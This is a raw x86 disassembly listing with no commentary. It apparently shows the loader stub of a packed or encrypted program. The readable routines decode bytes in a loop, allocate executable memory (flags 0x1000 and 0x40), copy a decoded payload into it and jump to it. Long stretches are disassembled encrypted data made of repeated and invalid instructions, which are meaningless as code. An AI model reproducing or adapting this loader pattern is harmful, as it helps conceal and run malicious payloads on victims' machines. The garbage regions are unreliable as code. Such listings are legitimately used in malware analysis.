  4213ef:	loop   0x4213c7
  4213f1:	jbe    0x421406
  4213f3:	popf   
  4213f4:	push   es
  4213f5:	mov    bh,0x9b
  4213f7:	mov    dl,dl
  4213f9:	test   BYTE PTR [ecx+0x3107704f],ah
  4213ff:	test   DWORD PTR ss:[eax],eax
  421402:	repnz adc ebp,DWORD PTR [edi+0x47a53fde]
  421409:	aam    0xa3
  42140b:	mov    ebx,0x548af727
  421410:	dec    esi
  421411:	push   eax
  421412:	push   0xe512e712
  421417:	sbb    DWORD PTR [esi+0x7f],edx
  42141a:	shr    BYTE PTR [ecx-0x60],0x46
  42141e:	sbb    BYTE PTR [edi],al
  421420:	adc    al,0x66
  421422:	push   ebx
  421423:	cdq    
  421424:	out    0x66,eax
  421426:	stos   DWORD PTR es:[edi],eax
  421427:	jne    0x4213b9
  421429:	into   
  42142a:	lods   eax,DWORD PTR ds:[esi]
  42142b:	ror    BYTE PTR [esi],cl
  42142d:	cs xor cl,bl
  421430:	addr16 dec ebp
  421432:	adc    ah,bh
  421434:	push   ebp
  421435:	pop    ebp
  421436:	pop    es
  421437:	jne    0x42144b
  421439:	mov    BYTE PTR [ecx],ah
  42143b:	mov    bl,0x14
  42143d:	dec    esi
  42143e:	aad    0xeb
  421440:	adc    al,0x71
  421442:	les    edi,FWORD PTR [edx+edi*4]
  421445:	jmp    0x8b4404e6
  42144a:	lahf   
  42144b:	out    0x39,eax
  42144d:	stos   BYTE PTR es:[edi],al
  42144e:	or     al,0x28
  421450:	mov    edi,0xf1f93ad0
  421455:	mov    ebp,DWORD PTR [edx-0x67c4f77a]
  42145b:	data16 sti 
  42145d:	jnp    0x421498
  42145f:	jecxz  0x42148f
  421461:	enter  0xa06,0xfb
  421465:	xchg   ebp,eax
  421466:	dec    ecx
  421467:	add    DWORD PTR [ebp-0x1d],edi
  42146a:	cmp    DWORD PTR [ebx],eax
  42146c:	ficomp WORD PTR [edi]
  42146e:	imul   BYTE PTR [esi-0x17]
  421471:	fs inc eax
  421473:	jle    0x4213fe
  421475:	adc    DWORD PTR [eax],eax
  421477:	js     0x42142f
  421479:	sub    DWORD PTR [edx],0xffffffda
  42147c:	outs   dx,DWORD PTR ds:[esi]
  42147d:	inc    esi
  42147e:	sbb    dl,BYTE PTR [edi]
  421480:	lods   al,BYTE PTR ds:[esi]
  421481:	jp     0x421491
  421483:	mov    ebx,0x6f6ed5fe
  421488:	jge    0x4214c7
  42148a:	sub    DWORD PTR [ebx+0x6ba99065],esi
  421490:	mov    cl,0xbb
  421492:	jp     0x4214a6
  421494:	xchg   esp,eax
  421495:	add    BYTE PTR [edx],0x14
  421498:	lods   al,BYTE PTR ds:[esi]
  421499:	outs   dx,BYTE PTR ds:[esi]
  42149a:	cmp    edi,edx
  42149c:	push   esi
  42149d:	ss imul ebx,edx,0x9a4fddbd
  4214a4:	mov    ch,BYTE PTR [edi-0x67ea58ae]
  4214aa:	sti    
  4214ab:	xor    eax,DWORD PTR [esi-0x434618]
  4214b1:	inc    esp
  4214b2:	dec    ecx
  4214b3:	aas    
  4214b4:	fcom   QWORD PTR [ebp+0x1f]
  4214b7:	mov    DWORD PTR [edx-0x7],edi
  4214ba:	sti    
  4214bb:	pop    ds
  4214bc:	call   0x80bba208
  4214c1:	add    DWORD PTR [ecx+0x12],0x3
  4214c5:	or     edi,ebp
  4214c7:	and    bl,BYTE PTR [ebx+esi*1-0x6f6f3c40]
  4214ce:	nop
  4214cf:	nop
  4214d0:	push   ecx
  4214d1:	push   ebp
  4214d2:	mov    ebp,DWORD PTR [esp+0x10]
  4214d6:	xor    eax,eax
  4214d8:	test   ebp,ebp
  4214da:	push   esi
  4214db:	mov    DWORD PTR [esp+0x8],eax
  4214df:	mov    esi,0xfffffffd
  4214e4:	je     0x421546
  4214e6:	push   ebx
  4214e7:	push   edi
  4214e8:	mov    edi,DWORD PTR [esp+0x18]
  4214ec:	mov    DWORD PTR [esp+0x1c],0x1
  4214f4:	mov    cl,BYTE PTR [esi+ebp*1+0x3]
  4214f8:	add    esi,0x2
  4214fb:	inc    esi
  4214fc:	mov    BYTE PTR [esi+edi*1],cl
  4214ff:	mov    ecx,DWORD PTR [esp+0x24]
  421503:	movzx  ecx,BYTE PTR [eax+ecx*1]
  421507:	mov    edx,DWORD PTR [esp+0x10]
  42150b:	mov    eax,DWORD PTR [esp+0x1c]
  42150f:	add    edx,eax
  421511:	mov    DWORD PTR [esp+0x10],edx
  421515:	ror    eax,cl
  421517:	mov    eax,DWORD PTR [esp+0x10]
  42151b:	mov    edx,eax
  42151d:	shr    edx,0x3
  421520:	mov    ebx,0x1
  421525:	sub    ebx,edx
  421527:	imul   eax,ebx
  42152a:	mov    DWORD PTR [esp+0x10],eax
  42152e:	shl    ebx,0x3
  421531:	mov    bl,BYTE PTR [esi+edi*1]
  421534:	add    bl,cl
  421536:	mov    ecx,DWORD PTR [esp+0x20]
  42153a:	mov    BYTE PTR [esi+edi*1],bl
  42153d:	sub    esi,0x2
  421540:	cmp    esi,ecx
  421542:	jl     0x4214f4
  421544:	pop    edi
  421545:	pop    ebx
  421546:	pop    esi
  421547:	pop    ebp
  421548:	pop    ecx
  421549:	ret    
  42154a:	nop
  42154b:	nop
  42154c:	nop
  42154d:	nop
  42154e:	nop
  42154f:	nop
  421550:	push   ebp
  421551:	mov    ebp,esp
  421553:	sub    esp,0x78
  421556:	push   esi
  421557:	mov    DWORD PTR [ebp-0x50],0x0
  42155e:	mov    DWORD PTR [ebp-0x18],0x0
  421565:	mov    DWORD PTR [ebp-0x78],0x0
  42156c:	mov    DWORD PTR [ebp-0x68],0x0
  421573:	mov    DWORD PTR [ebp-0x8],0x0
  42157a:	mov    DWORD PTR [ebp-0x74],0x0
  421581:	mov    DWORD PTR [ebp-0x70],0x0
  421588:	mov    DWORD PTR [ebp-0x14],0x0
  42158f:	mov    DWORD PTR [ebp-0x54],0x0
  421596:	mov    DWORD PTR [ebp-0x10],0x0
  42159d:	mov    DWORD PTR [ebp-0x60],0x0
  4215a4:	mov    DWORD PTR [ebp-0x4],0x0
  4215ab:	mov    DWORD PTR [ebp-0x64],0x0
  4215b2:	mov    DWORD PTR [ebp-0x30],0x0
  4215b9:	mov    DWORD PTR [ebp-0x5c],0x0
  4215c0:	mov    DWORD PTR [ebp-0x2c],0x0
  4215c7:	mov    DWORD PTR [ebp-0x58],0x0
  4215ce:	mov    DWORD PTR [ebp-0xc],0x0
  4215d5:	mov    eax,ds:0x428108
  4215da:	mov    DWORD PTR [ebp-0x28],eax
  4215dd:	mov    ecx,DWORD PTR ds:0x42810c
  4215e3:	mov    DWORD PTR [ebp-0x24],ecx
  4215e6:	mov    edx,DWORD PTR ds:0x428110
  4215ec:	mov    DWORD PTR [ebp-0x20],edx
  4215ef:	mov    al,ds:0x428114
  4215f4:	mov    BYTE PTR [ebp-0x1c],al
  4215f7:	mov    ecx,DWORD PTR ds:0x4280f8
  4215fd:	mov    DWORD PTR [ebp-0x40],ecx
  421600:	mov    edx,DWORD PTR ds:0x4280fc
  421606:	mov    DWORD PTR [ebp-0x3c],edx
  421609:	mov    eax,ds:0x428100
  42160e:	mov    DWORD PTR [ebp-0x38],eax
  421611:	mov    cx,WORD PTR ds:0x428104
  421618:	mov    WORD PTR [ebp-0x34],cx
  42161c:	mov    dl,BYTE PTR ds:0x428106
  421622:	mov    BYTE PTR [ebp-0x32],dl
  421625:	mov    DWORD PTR [ebp-0x30],0x40
  42162c:	lea    eax,[ebp-0x10]
  42162f:	push   eax
  421630:	lea    ecx,[ebp-0x10]
  421633:	push   ecx
  421634:	lea    edx,[ebp-0x14]
  421637:	push   edx
  421638:	call   DWORD PTR ds:0x428000
  42163e:	test   eax,eax
  421640:	je     0x42164b
  421642:	mov    eax,DWORD PTR [ebp-0x10]
  421645:	add    eax,0x1
  421648:	mov    DWORD PTR [ebp-0x10],eax
  42164b:	mov    DWORD PTR [ebp-0x48],0x0
  421652:	mov    DWORD PTR [ebp-0x4c],0x0
  421659:	push   0x1
  42165b:	lea    ecx,[ebp-0x14]
  42165e:	push   ecx
  42165f:	call   DWORD PTR ds:0x428004
  421665:	mov    BYTE PTR [ebp-0x40],0x56
  421669:	call   DWORD PTR ds:0x428014
  42166f:	mov    DWORD PTR [ebp-0x2c],eax
  421672:	mov    BYTE PTR [ebp-0x3e],0x72
  421676:	movzx  edx,WORD PTR [ebp-0x2c]
  42167a:	test   edx,edx
  42167c:	jne    0x4216be
  42167e:	mov    BYTE PTR [ebp-0x34],0x0
  421682:	mov    DWORD PTR [ebp-0x14],0xe0d
  421689:	lea    eax,[ebp-0x28]
  42168c:	push   eax
  42168d:	call   DWORD PTR ds:0x428018
  421693:	mov    DWORD PTR [ebp-0x68],eax
  421696:	mov    DWORD PTR [ebp-0x5c],0x3a
  42169d:	lea    ecx,[ebp-0x40]
  4216a0:	push   ecx
  4216a1:	mov    edx,DWORD PTR [ebp-0x68]
  4216a4:	push   edx
  4216a5:	call   DWORD PTR ds:0x42801c
  4216ab:	mov    DWORD PTR [ebp-0x44],eax
  4216ae:	mov    DWORD PTR [ebp-0x8],0xd90062a5
  4216b5:	mov    DWORD PTR [ebp-0x70],0x10c93f
  4216bc:	jmp    0x4216d3
  4216be:	mov    BYTE PTR ds:0x443a58,0x0
  4216c5:	mov    BYTE PTR ds:0x42bb88,0x0
  4216cc:	mov    BYTE PTR ds:0x441b18,0x0
  4216d3:	mov    DWORD PTR [ebp-0x2c],0x410000
  4216da:	push   DWORD PTR ds:0x428018
  4216e0:	pop    edx
  4216e1:	mov    DWORD PTR [ebp-0x74],edx
  4216e4:	push   DWORD PTR [ebp-0x30]
  4216e7:	push   0x1000
  4216ec:	mov    eax,DWORD PTR [ebp-0x14]
  4216ef:	add    eax,0x23
  4216f2:	add    eax,0x23
  4216f5:	push   eax
  4216f6:	xor    eax,eax
  4216f8:	push   eax
  4216f9:	mov    ecx,DWORD PTR [ebp-0x44]
  4216fc:	call   ecx
  4216fe:	mov    edx,eax
  421700:	mov    DWORD PTR [ebp-0x4],edx
  421703:	mov    eax,DWORD PTR [ebp-0x70]
  421706:	sub    eax,0xdae0b
  42170b:	mov    DWORD PTR [ebp-0x70],eax
  42170e:	cmp    DWORD PTR [ebp-0x4],0x0
  421712:	jne    0x42171b
  421714:	mov    BYTE PTR ds:0x441b18,0x0
  42171b:	mov    ecx,DWORD PTR [ebp-0x4]
  42171e:	add    ecx,DWORD PTR [ebp-0x14]
  421721:	mov    edx,DWORD PTR [ebp-0x8]
  421724:	mov    DWORD PTR [ecx],edx
  421726:	mov    eax,DWORD PTR [ebp-0x4]
  421729:	add    eax,DWORD PTR [ebp-0x5c]
  42172c:	mov    DWORD PTR [ebp-0x64],eax
  42172f:	mov    ecx,DWORD PTR ds:0x42801c
  421735:	mov    DWORD PTR [ebp-0x54],ecx
  421738:	mov    edx,DWORD PTR [ebp-0x4]
  42173b:	add    edx,DWORD PTR [ebp-0x14]
  42173e:	mov    eax,DWORD PTR [ebp+0x8]
  421741:	mov    DWORD PTR [edx+0x4],eax
  421744:	mov    ecx,DWORD PTR [ebp-0x4]
  421747:	add    ecx,DWORD PTR [ebp-0x14]
  42174a:	mov    DWORD PTR [ebp-0xc],ecx
  42174d:	cmp    DWORD PTR [ebp-0x70],0x0
  421751:	jbe    0x42176e
  421753:	mov    edx,DWORD PTR [ebp-0xc]
  421756:	push   edx
  421757:	mov    eax,DWORD PTR [ebp-0x14]
  42175a:	push   eax
  42175b:	mov    ecx,DWORD PTR [ebp-0x2c]
  42175e:	add    ecx,DWORD PTR [ebp-0x70]
  421761:	push   ecx
  421762:	mov    edx,DWORD PTR [ebp-0x4]
  421765:	push   edx
  421766:	call   0x4214d0
  42176b:	add    esp,0x10
  42176e:	cmp    DWORD PTR [ebp-0x64],0x0
  421772:	je     0x421786
  421774:	mov    ecx,DWORD PTR [ebp-0x54]
  421777:	push   ecx
  421778:	push   DWORD PTR [ebp-0x74]
  42177b:	mov    esi,DWORD PTR [ebp-0x64]
  42177e:	push   edx
  42177f:	pop    eax
  421780:	push   ecx
  421781:	nop
  421782:	jmp    esi
  421784:	jmp    0x42178c
  421786:	mov    eax,DWORD PTR [ebp+0x8]
  421789:	mov    DWORD PTR [ebp-0x18],eax
  42178c:	mov    eax,0x1
  421791:	pop    esi
  421792:	mov    esp,ebp
  421794:	pop    ebp
  421795:	ret    
  421796:	int3   
  421797:	int3   
  421798:	int3   
  421799:	int3   
  42179a:	int3   
  42179b:	int3   
  42179c:	int3   
  42179d:	int3   
  42179e:	int3   
  42179f:	int3   
  4217a0:	push   ebp
  4217a1:	mov    ebp,esp
  4217a3:	sub    esp,0x8
  4217a6:	mov    eax,ds:0x428014
  4217ab:	push   0x0
  4217ad:	push   0xb2
  4217b2:	push   0x82
  4217b7:	push   0x0
  4217b9:	push   0xffffffff
  4217bb:	mov    DWORD PTR [ebp-0x4],0x0
  4217c2:	mov    DWORD PTR [ebp-0x8],eax
  4217c5:	call   DWORD PTR ds:0x428010
  4217cb:	push   DWORD PTR [ebp-0x8]
  4217ce:	pop    edx
  4217cf:	call   edx
  4217d1:	push   eax
  4217d2:	pop    DWORD PTR [ebp-0x4]
  4217d5:	mov    eax,DWORD PTR [ebp-0x4]
  4217d8:	dec    eax
  4217d9:	cmp    eax,0x56
  4217dc:	jne    0x4217eb
  4217de:	push   0x5b990b9f
  4217e3:	call   0x421550
  4217e8:	add    esp,0x4
  4217eb:	xor    eax,eax
  4217ed:	mov    esp,ebp
  4217ef:	pop    ebp
  4217f0:	ret    
  4217f1:	nop
  4217f2:	nop
  4217f3:	nop
  4217f4:	nop
  4217f5:	nop
  4217f6:	nop
  4217f7:	nop
  4217f8:	nop
  4217f9:	nop
  4217fa:	nop
  4217fb:	nop
  4217fc:	nop
  4217fd:	nop
  4217fe:	nop
  4217ff:	nop
  421800:	sub    esp,0x10
  421803:	lea    eax,[esp+0x0]
  421807:	push   eax
  421808:	call   DWORD PTR ds:0x42800c
  42180e:	cmp    WORD PTR [esp+0x0],0x0
  421814:	je     0x42182d
  421816:	push   0x0
  421818:	call   0x4217a0
  42181d:	add    esp,0x4
  421820:	call   0x411000
  421825:	xor    eax,eax
  421827:	add    esp,0x10
  42182a:	ret    0x10
  42182d:	jmp    edx
  42182f:	push   ebp
  421830:	and    ebx,DWORD PTR [edi+0x47]
  421833:	mov    ebp,edx
  421835:	sbb    DWORD PTR [eax],ebp
  421837:	adc    DWORD PTR [eax],edi
  421839:	jp     0x421817
  42183b:	push   eax
  42183c:	btr    edi,esp
  42183f:	inc    esp
  421840:	mov    ebp,edx
  421842:	sbb    DWORD PTR [ecx+edx*1],ebp
  421845:	cmp    BYTE PTR [edx],bh
  421847:	and    ebp,DWORD PTR [edi+0x445fb30f]
  42184d:	mov    ebp,edx
  42184f:	sbb    DWORD PTR [ecx+edx*1],ebp
  421852:	cmp    BYTE PTR [edx+0x23],bh
  421855:	scas   eax,DWORD PTR es:[edi]
  421856:	btr    DWORD PTR [edi+0x44],ebx
  42185a:	mov    ebp,edx
  42185c:	sbb    DWORD PTR [ecx+edx*1],ebp
  42185f:	cmp    BYTE PTR [edx+0x23],bh
  421862:	scas   eax,DWORD PTR es:[edi]
  421863:	btr    DWORD PTR [edi+0x44],ebx
  421867:	mov    ebp,edx
  421869:	sbb    esp,edx
  42186b:	adc    DWORD PTR [eax],edi
  42186d:	jp     0x42189c
  42186f:	mov    al,0xb5
  421871:	mov    ebp,0x2782f05f
  421876:	cmp    BYTE PTR [eax+edx*1-0x4fd488c],dl
  42187d:	fisubr DWORD PTR [si]
  421880:	fs sti 
  421882:	cwde   
  421883:	jbe    0x4218d0
  421885:	arpl   WORD PTR [ecx+0x17],bx
  421888:	add    ecx,esp
  42188a:	outs   dx,BYTE PTR ds:[esi]
  42188b:	fnsave [ecx]
  42188d:	sub    edi,edi
  42188f:	retf   0x497b
  421892:	xor    DWORD PTR [edx+0xf],ecx
  421895:	dec    ebp
  421896:	(bad)  
  421897:	data16 fnstsw WORD PTR [edi+0x0]
  42189b:	les    edi,FWORD PTR [ecx+0x5c7e4139]
  4218a1:	pop    ds
  4218a2:	or     eax,0x7bb902a2
  4218a7:	inc    esp
  4218a8:	mov    ebp,edx
  4218aa:	sbb    DWORD PTR [ecx+edx*1],ebp
  4218ad:	cmp    BYTE PTR [ebp-0x46],bh
  4218b0:	push   ebx
  4218b1:	push   esi
  4218b2:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4218b4:	(bad)  
  4218b5:	sub    DWORD PTR [ecx+0x7b1bbee1],0x57a5b182
  4218bf:	(bad)  
  4218c0:	push   ebx
  4218c1:	dec    esi
  4218c2:	aam    0x12
  4218c4:	mov    esp,DWORD PTR [esi]
  4218c6:	dec    ecx
  4218c7:	pop    ebp
  4218c8:	inc    edx
  4218c9:	sub    DWORD PTR [ebp-0x9],ebp
  4218cc:	and    DWORD PTR [ebp+0x1c],edx
  4218cf:	out    dx,al
  4218d0:	rcl    DWORD PTR [ebx],cl
  4218d2:	inc    esp
  4218d3:	jmp    0x21518982
  4218d8:	ss mov ecx,0xe019bc19
  4218de:	push   ebx
  4218df:	lods   al,BYTE PTR ds:[esi]
  4218e0:	add    BYTE PTR [edx],dh
  4218e2:	xor    bl,bl
  4218e4:	cmp    eax,0x45dff905
  4218e9:	xor    DWORD PTR [edx+0x7b1bbee1],0x27a5b082
  4218f3:	dec    edx
  4218f4:	int    0x4e
  4218f6:	xor    al,0x32
  4218f8:	cdq    
  4218f9:	es pop esp
  4218fb:	shr    al,0x29
  4218fe:	imul   DWORD PTR [edx-0x72]
  421901:	push   ebp
  421902:	dec    esp
  421903:	jae    0x42197d
  421905:	adc    esi,DWORD PTR [esp+esi*2+0x30]
  421909:	jo     0x42196c
  42190b:	push   edi
  42190c:	popf   
  42190d:	mov    ecx,0xe0842107
  421912:	pop    ebx
  421913:	aam    0x83
  421915:	xor    ch,BYTE PTR [eax]
  421917:	dec    edx
  421918:	int3   
  421919:	lock cmps DWORD PTR ds:[si],DWORD PTR es:[di]
  42191c:	(bad)  
  42191d:	sub    edx,0x38112c19
  421923:	jp     0x421948
  421925:	scas   eax,DWORD PTR es:[edi]
  421926:	pop    edi
  421927:	neg    BYTE PTR [edi+0x44]
  42192a:	(bad)  
  42192b:	jmp    0x421948
  42192d:	sub    al,0xb1
  42192f:	call   0xff18545
  421934:	mov    bl,0x5f
  421936:	inc    esp
  421937:	mov    ebp,edx
  421939:	sbb    esp,ecx
  42193b:	adc    DWORD PTR [ebx],edi
  42193d:	jnp    0x421967
  42193f:	scas   al,BYTE PTR es:[edi]
  421940:	add    eax,0x8faa5fb3
  421945:	jmp    0x237a:0x38179019
  42194c:	scas   eax,DWORD PTR es:[edi]
  42194d:	cpuid  
  42194f:	loop   0x421995
  421951:	mov    ebp,edx
  421953:	or     DWORD PTR [ecx+edx*1],ebp
  421956:	cmp    BYTE PTR [edx+0x26],bh
  421959:	scas   eax,DWORD PTR es:[edi]
  42195a:	btr    DWORD PTR [esi],ebx
  42195d:	inc    esp
  42195e:	mov    edi,edx
  421960:	sbb    DWORD PTR [ecx+edx*1],ebp
  421963:	cmp    bh,BYTE PTR [edx+0x23]
  421966:	stos   BYTE PTR es:[edi],al
  421967:	lss    ebx,FWORD PTR [edi+0x44]
  42196b:	mov    ebp,edx
  42196d:	sbb    DWORD PTR [ecx],ebp
  42196f:	adc    DWORD PTR [ecx],edi
  421971:	jp     0x421996
  421973:	scas   eax,DWORD PTR es:[edi]
  421974:	btr    DWORD PTR [edi+0x14],ebx
  421978:	xchg   edx,ebp
  42197a:	sbb    DWORD PTR [eax],ebp
  42197c:	adc    DWORD PTR [eax],edi
  42197e:	jnp    0x421947
  421980:	stos   BYTE PTR es:[edi],al
  421981:	cmpxchg DWORD PTR [edi+0x44],ebx
  421985:	or     ebp,edx
  421987:	sbb    DWORD PTR [ecx+edx*1],edi
  42198a:	cmp    BYTE PTR [edx+0x23],ch
  42198d:	scas   eax,DWORD PTR es:[edi]
  42198e:	btr    DWORD PTR [edi+0x44],ecx
  421992:	mov    edi,edx
  421994:	sbb    DWORD PTR [ecx+edx*1],ebp
  421997:	cmp    BYTE PTR [edx+0x23],bh
  42199a:	mov    edi,0x445fb30f
  42199f:	mov    ebp,edx
  4219a1:	sbb    DWORD PTR [ecx+edx*1],ebp
  4219a4:	cmp    BYTE PTR [edx-0x29],bh
  4219a7:	xchg   esi,eax
  4219a8:	add    esi,DWORD PTR [ebx-0x1574b8ca]
  4219ae:	sbb    esp,ebx
  4219b0:	sbb    bh,BYTE PTR [eax]
  4219b2:	xor    eax,0xb30faf6a
  4219b7:	pop    edi
  4219b8:	inc    esp
  4219b9:	mov    ebp,edx
  4219bb:	sbb    DWORD PTR [ecx+edx*1],ebp
  4219be:	cmp    BYTE PTR [edx+0x23],bh
  4219c1:	scas   eax,DWORD PTR es:[edi]
  4219c2:	btr    DWORD PTR [edi+0x44],ebx
  4219c6:	mov    ebp,edx
  4219c8:	sbb    DWORD PTR [ecx+edx*1],ebp
  4219cb:	cmp    BYTE PTR [edx+0x23],bh
  4219ce:	scas   eax,DWORD PTR es:[edi]
  4219cf:	btr    DWORD PTR [edi+0x44],ebx
  4219d3:	mov    ebp,edx
  4219d5:	sbb    DWORD PTR [ecx+edx*1],ebp
  4219d8:	cmp    BYTE PTR [edx+0x23],bh
  4219db:	scas   eax,DWORD PTR es:[edi]
  4219dc:	btr    DWORD PTR [edi+0x44],ebx
  4219e0:	mov    ebp,edx
  4219e2:	sbb    DWORD PTR [ecx+edx*1],ebp
  4219e5:	cmp    BYTE PTR [edx+0x23],bh
  4219e8:	scas   eax,DWORD PTR es:[edi]
  4219e9:	btr    DWORD PTR [edi+0x44],ebx
  4219ed:	mov    ebp,edx
  4219ef:	sbb    DWORD PTR [ecx+edx*1],ebp
  4219f2:	cmp    BYTE PTR [edx+0x23],bh
  4219f5:	scas   eax,DWORD PTR es:[edi]
  4219f6:	btr    DWORD PTR [edi+0x44],ebx
  4219fa:	mov    ebp,edx
  4219fc:	sbb    DWORD PTR [ecx+edx*1],ebp
  4219ff:	cmp    BYTE PTR [edx+0x23],bh
  421a02:	scas   eax,DWORD PTR es:[edi]
  421a03:	btr    DWORD PTR [edi+0x44],ebx
  421a07:	mov    ebp,edx
  421a09:	sbb    DWORD PTR [ecx+edx*1],ebp
  421a0c:	cmp    BYTE PTR [edx+0x23],bh
  421a0f:	scas   eax,DWORD PTR es:[edi]
  421a10:	btr    DWORD PTR [edi+0x44],ebx
  421a14:	mov    ebp,edx
  421a16:	sbb    DWORD PTR [ecx+edx*1],ebp
  421a19:	cmp    BYTE PTR [edx+0x23],bh
  421a1c:	scas   eax,DWORD PTR es:[edi]
  421a1d:	setge  BYTE PTR [ebx]
  421a20:	and    ebx,esi
  421a22:	sahf   
  421a23:	sbb    DWORD PTR [ecx+edx*1],ebp
  421a26:	cmp    BYTE PTR [edx-0x5cf050d8],bl
  421a2c:	pop    edi
  421a2d:	inc    esp
  421a2e:	mov    edi,DWORD PTR [esi]
  421a30:	sbb    eax,0x7a3c112c
  421a35:	and    edi,edi
  421a37:	dec    edx
  421a38:	lock ins DWORD PTR es:[edi],dx
  421a3a:	adc    ah,al
  421a3c:	jmp    0x37a:0x38112c19
  421a43:	scas   eax,DWORD PTR es:[edi]
  421a44:	rcpps  xmm6,XMMWORD PTR [ecx+0x36]
  421a48:	clc    
  421a49:	cwde   
  421a4a:	jp     0x421a78
  421a4c:	adc    DWORD PTR [eax],edi
  421a4e:	jp     0x421a93
  421a50:	scas   eax,DWORD PTR es:[edi]
  421a51:	btr    DWORD PTR [edi+0x43ea8b4f],ebp
  421a58:	sub    al,0x11
  421a5a:	cmp    BYTE PTR [edx-0x4cf050d9],ah
  421a60:	pop    edi
  421a61:	inc    esp
  421a62:	mov    ebp,edx
  421a64:	sbb    DWORD PTR [ecx+edx*1],ebp
  421a67:	cmp    BYTE PTR [edx+0x23],bh
  421a6a:	(bad)  
  421a6b:	btr    DWORD PTR [edi+0x19ea8b44],edi
  421a72:	sub    al,0x11
  421a74:	cmp    BYTE PTR [edx+0x23],bh
  421a77:	scas   eax,DWORD PTR es:[edi]
  421a78:	btr    DWORD PTR [edi+0x44],ebx
  421a7c:	mov    ebp,edx
  421a7e:	sbb    DWORD PTR [ecx+edx*1],ebp
  421a81:	cmp    BYTE PTR [edx+0x23],bh
  421a84:	scas   eax,DWORD PTR es:[edi]
  421a85:	btr    DWORD PTR [edi+0x44],ebx
  421a89:	mov    ebp,edx
  421a8b:	sbb    DWORD PTR [ecx+edx*1],ebp
  421a8e:	cmp    BYTE PTR [edx+0x23],bh
  421a91:	scas   eax,DWORD PTR es:[edi]
  421a92:	btr    DWORD PTR [edi+0x44],ebx
  421a96:	mov    ebp,edx
  421a98:	sbb    DWORD PTR [ecx+edx*1],ebp
  421a9b:	cmp    BYTE PTR [edx+0x23],bh
  421a9e:	scas   eax,DWORD PTR es:[edi]
  421a9f:	btr    DWORD PTR [edi+0x44],ebx
  421aa3:	mov    ebp,edx
  421aa5:	sbb    DWORD PTR [ecx+edx*1],ebp
  421aa8:	cmp    BYTE PTR [edx+0x23],bh
  421aab:	scas   eax,DWORD PTR es:[edi]
  421aac:	btr    DWORD PTR [edi+0x44],ebx
  421ab0:	mov    ebp,edx
  421ab2:	sbb    DWORD PTR [ecx+edx*1],ebp
  421ab5:	cmp    BYTE PTR [edx+0x23],bh
  421ab8:	scas   eax,DWORD PTR es:[edi]
  421ab9:	btr    DWORD PTR [edi+0x44],ebx
  421abd:	mov    ebp,edx
  421abf:	sbb    DWORD PTR [ecx+edx*1],ebp
  421ac2:	cmp    BYTE PTR [edx+0x23],bh
  421ac5:	scas   eax,DWORD PTR es:[edi]
  421ac6:	btr    DWORD PTR [edi+0x44],ebx
  421aca:	mov    ebp,edx
  421acc:	sbb    DWORD PTR [ecx+edx*1],ebp
  421acf:	cmp    BYTE PTR [edx+0x23],bh
  421ad2:	scas   eax,DWORD PTR es:[edi]
  421ad3:	btr    DWORD PTR [edi+0x44],ebx
  421ad7:	mov    ebp,edx
  421ad9:	sbb    DWORD PTR [ecx+edx*1],ebp
  421adc:	cmp    BYTE PTR [edx+0x23],bh
  421adf:	scas   eax,DWORD PTR es:[edi]
  421ae0:	btr    DWORD PTR [edi+0x44],ebx
  421ae4:	mov    ebp,edx
  421ae6:	sbb    DWORD PTR [ecx+edx*1],ebp
  421ae9:	cmp    BYTE PTR [edx+0x23],bh
  421aec:	scas   eax,DWORD PTR es:[edi]
  421aed:	btr    DWORD PTR [edi+0x44],ebx
  421af1:	mov    ebp,edx
  421af3:	sbb    DWORD PTR [ecx+edx*1],ebp
  421af6:	cmp    BYTE PTR [edx+0x23],bh
  421af9:	scas   eax,DWORD PTR es:[edi]
  421afa:	btr    DWORD PTR [edi+0x44],ebx
  421afe:	mov    ebp,edx
  421b00:	sbb    DWORD PTR [ecx+edx*1],ebp
  421b03:	cmp    BYTE PTR [edx+0x23],bh
  421b06:	scas   eax,DWORD PTR es:[edi]
  421b07:	btr    DWORD PTR [edi+0x44],ebx
  421b0b:	mov    ebp,edx
  421b0d:	sbb    DWORD PTR [ecx+edx*1],ebp
  421b10:	cmp    BYTE PTR [edx+0x23],bh
  421b13:	scas   eax,DWORD PTR es:[edi]
  421b14:	btr    DWORD PTR [edi+0x44],ebx
  421b18:	mov    ebp,edx
  421b1a:	sbb    DWORD PTR [ecx+edx*1],ebp
  421b1d:	cmp    BYTE PTR [edx+0x23],bh
  421b20:	scas   eax,DWORD PTR es:[edi]
  421b21:	btr    DWORD PTR [edi+0x44],ebx
  421b25:	mov    ebp,edx
  421b27:	sbb    DWORD PTR [ecx+edx*1],ebp
  421b2a:	cmp    BYTE PTR [edx+0x23],bh
  421b2d:	scas   eax,DWORD PTR es:[edi]
  421b2e:	btr    DWORD PTR [edi+0x44],ebx
  421b32:	mov    ebp,edx
  421b34:	sbb    DWORD PTR [ecx+edx*1],ebp
  421b37:	cmp    BYTE PTR [edx+0x23],bh
  421b3a:	scas   eax,DWORD PTR es:[edi]
  421b3b:	btr    DWORD PTR [edi+0x44],ebx
  421b3f:	mov    ebp,edx
  421b41:	sbb    DWORD PTR [ecx+edx*1],ebp
  421b44:	cmp    BYTE PTR [edx+0x23],bh
  421b47:	scas   eax,DWORD PTR es:[edi]
  421b48:	btr    DWORD PTR [edi+0x44],ebx
  421b4c:	mov    ebp,edx
  421b4e:	sbb    DWORD PTR [ecx+edx*1],ebp
  421b51:	cmp    BYTE PTR [edx+0x23],bh
  421b54:	scas   eax,DWORD PTR es:[edi]
  421b55:	btr    DWORD PTR [edi+0x44],ebx
  421b59:	mov    ebp,edx
  421b5b:	sbb    DWORD PTR [ecx+edx*1],ebp
  421b5e:	cmp    BYTE PTR [edx+0x23],bh
  421b61:	scas   eax,DWORD PTR es:[edi]
  421b62:	btr    DWORD PTR [edi+0x44],ebx
  421b66:	mov    ebp,edx
  421b68:	sbb    DWORD PTR [ecx+edx*1],ebp
  421b6b:	cmp    BYTE PTR [edx+0x23],bh
  421b6e:	scas   eax,DWORD PTR es:[edi]
  421b6f:	btr    DWORD PTR [edi+0x44],ebx
  421b73:	mov    ebp,edx
  421b75:	sbb    DWORD PTR [ecx+edx*1],ebp
  421b78:	cmp    BYTE PTR [edx+0x23],bh
  421b7b:	scas   eax,DWORD PTR es:[edi]
  421b7c:	btr    DWORD PTR [edi+0x44],ebx
  421b80:	mov    ebp,edx
  421b82:	sbb    DWORD PTR [ecx+edx*1],ebp
  421b85:	cmp    BYTE PTR [edx+0x23],bh
  421b88:	scas   eax,DWORD PTR es:[edi]
  421b89:	btr    DWORD PTR [edi+0x44],ebx
